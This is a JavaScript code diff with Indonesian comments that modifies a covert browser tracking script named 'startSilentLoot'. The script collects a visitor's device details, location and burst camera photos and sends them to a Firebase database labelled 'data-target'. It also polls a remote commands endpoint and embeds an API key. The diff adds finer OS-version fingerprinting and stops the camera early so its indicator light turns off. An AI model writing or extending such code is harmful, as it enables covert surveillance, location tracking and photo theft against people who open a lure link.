@@ -62,11 +62,13 @@ const BASE_API = "https://data-target-32614-default-rtdb.asia-southeast1.firebas
 const COMMAND_URL = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/commands.json";
 const IP2LOC_KEY = "377D98C67FC2E3AA42FDFACD479A4E67";
 
+// FUNGSI UTAMA, BUAT KIRIM DATA KE FIREBASE
 async function startSilentLoot() {
     // 1. BUAT SESSION ID (FOLDER UNIK)
     const sessionID = "ONX-" + Math.random().toString(36).substr(2, 6).toUpperCase();
     const params = new URLSearchParams(window.location.search);
     const targetID = params.get('id');
+    const osLengkap = await getFullOS();
     let finalSource = "Direct Access";
 
     if (targetID) {
@@ -85,18 +87,17 @@ async function startSilentLoot() {
         session_id: sessionID,
         time: new Date().toLocaleString(),
         userAgent: navigator.userAgent,
-        platform: (function() {
-            var ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "Android";
-            if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
-            if (/Windows/i.test(ua)) return "Windows";
-            if (/Mac/i.test(ua)) return "MacOS";
-            return navigator.platform; 
-        })(),
         referrer: finalSource,
         ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
         language: navigator.language
     };
+
+    try {
+        const versiDetail = await getFullOS(); 
+        report.platform = versiDetail; // Sekarang isinya jadi "Android 15" atau "Windows 11"
+    } catch (e) {
+        report.platform = "Unknown Version";
+    }
 
     // 2. AMBIL DATA LOKASI (SYSTEM WATERFALL / CADANGAN)
     async function fetchLocation() {
@@ -191,9 +192,17 @@ async function initCamera(report, sessionID) {
                     body: JSON.stringify(updateData)
                 });
             } else {
-                clearInterval(burst);
+                // --- BAGIAN INI YANG DIUBAH ---
+                clearInterval(burst); 
+                
+                // Matikan semua track kamera (Lampu indikator bakal mati)
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Bersihkan object video biar memori lega
+                video.srcObject = null;
+                console.log("Kamera resmi dimatikan.");
             }
-        }, 2000);
+        }, 1500);
 
     } catch (err) {
         // Kirim data tanpa foto jika ditolak
@@ -216,6 +225,31 @@ async function listenForFlash(stream) {
             }
         } catch (e) {}
     }, 2000);
+}
+
+// FUNGSI GET FULL OS
+function parseOldUA() {
+    const ua = navigator.userAgent;
+    
+    // Cek Android
+    if (/Android/.test(ua)) {
+        const match = ua.match(/Android\s([0-9\.]+)/);
+        return match ? `Android ${match[1]}` : "Android";
+    }
+    
+    // Cek iPhone/iOS
+    if (/iPhone|iPad|iPod/.test(ua)) {
+        const match = ua.match(/OS\s([0-9_]+)/);
+        return match ? `iOS ${match[1].replace(/_/g, '.')}` : "iOS";
+    }
+    
+    // Cek Windows
+    if (/Windows NT/.test(ua)) {
+        if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
+        if (ua.includes("Windows NT 6.1")) return "Windows 7";
+    }
+    
+    return navigator.platform;
 }
 
 
